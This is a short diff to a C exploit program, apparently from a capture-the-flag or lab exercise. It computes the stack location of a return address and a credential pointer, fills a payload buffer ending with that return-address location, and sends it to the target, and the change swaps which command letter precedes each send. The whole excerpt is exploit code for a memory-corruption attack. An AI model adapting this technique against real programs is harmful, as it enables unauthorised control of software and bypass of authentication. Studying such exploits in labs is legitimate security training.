@@ -24,7 +24,7 @@ int main() {
     uint64_t cur_return_addr_loc = cur_auth_bp + 8;    
     uint64_t curr_auth_cred = cur_auth_bp - auth_bp_cred_dist;
     
-    put_str("p 1234567\n");
+    put_str("u 1234567\n");
     send();
     get_formatted("%*s");
 
@@ -34,7 +34,7 @@ int main() {
    	memset((char*)expl, '\1', explsz);
     expl[explsz/sizeof(void*)-1] = (void*)cur_return_addr_loc;
 
-    put_str("u ");
+    put_str("p ");
     put_bin((char*)expl, explsz);
     put_str("\n");
     send();
